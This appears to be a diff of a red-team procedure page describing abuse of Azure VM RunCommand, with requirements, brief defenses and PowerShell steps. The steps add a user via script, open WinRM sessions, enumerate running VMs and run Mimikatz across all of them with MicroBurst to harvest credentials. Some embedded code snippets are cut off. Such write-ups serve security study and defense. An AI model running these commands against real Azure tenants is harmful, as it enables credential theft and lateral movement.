@@ -43,6 +43,8 @@ The Azure VM RunCommand Execution procedure allows an attacker to execute PowerS
 
 From a technical perspective, this procedure leverages the Azure RunCommand feature, which allows users to execute scripts and commands on Azure VMs. The feature uses the Azure VM Agent to execute the command or script, which runs as the SYSTEM user on the target VM. This can be used by an attacker to gain access to sensitive information or to move laterally through the network. From a business perspective, this procedure highlights the importance of securing access to Azure VMs and monitoring for suspicious activity.
 
+ 
+
 ## Requirements
 
 1. Valid authentication credentials for the Azure portal or Azure CLI ('* `Microsoft.Compute/virtualMachines/runCommand/action')`
@@ -50,6 +52,8 @@ From a technical perspective, this procedure leverages the Azure RunCommand feat
 1. Access to the target Azure VM(s)
 
 1. WinRM access to the target VM(s) (if using WinRM to connect)
+
+ 
 
 ## Defense
 
@@ -59,6 +63,8 @@ From a technical perspective, this procedure leverages the Azure RunCommand feat
 
 1. Implement network segmentation and access controls to limit lateral movement
 
+ 
+
 ## Objectives
 
 1. Gain remote code execution on a target Azure VM
@@ -67,22 +73,40 @@ From a technical perspective, this procedure leverages the Azure RunCommand feat
 
 1. Execute Mimikatz on multiple Azure VMs to obtain credentials
 
+ 
+
 # Instructions
 
 *<u>Overv*iew</u>
 
+
+
 *<u>adduser.p*s1:</u>
+
+
+
+
 
 **Code**: [[# adduser.ps1
 $passwd = ConvertTo-SecureString "P@]]
 
+
+
+
+
+
+
 **Code**: [[# Get Public IP of VM : query the network interfac]]
+
+
 
 ## 
 
 ## Steps
 
 1. Get the public IP of the VM by querying the network interface 
+
+
 
 **Command** ([[Get Public IP of VM]]):
 
@@ -92,11 +116,19 @@ Get-AzNetworkInterface -Name <RESOURCE368>
 Get-AzPublicIpAddress -Name <RESOURCEIP>
 ```
 
+
+
+
+
 **Command** ([[Execute Powershell script on the VM]]):
 
 ```powershell
 Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose
 ```
+
+
+
+
 
 **Command** ([[Connect via WinRM]]):
 
@@ -107,7 +139,11 @@ $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-
 Enter-PSSession $sess
 ```
 
+
+
             4. List all virtual machines currently runnong on Azure. Filtering out the virtual machines that are not running.
+
+
 
 **Command** ([[List available VMs]]):
 
@@ -115,13 +151,21 @@ Enter-PSSession $sess
 Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
 ```
 
+
+
+
+
 **Command** ([[Execute Powershell script on the VM]]):
 
 ```powershell
 Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
 ```
 
+
+
             6. (Optional) This command imports the MicroBurst PowerShell module and executes the Mimikatz script on multiple Azure VMs. 
+
+
 
 **Command** ([[Excecute Mimikatz on the all VMs in Azure with Microburst]]):
 
@@ -129,6 +173,10 @@ Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test 
 PS C:\> Import-module MicroBurst.psm1
 PS C:\> Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
 ```
+
+
+
+
 
 ## Platforms
 
@@ -160,3 +208,5 @@ PS C:\> Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
 
 - [[Cloud - Azure]]
 - [[Virtual Machine RunCommand]]
+
+
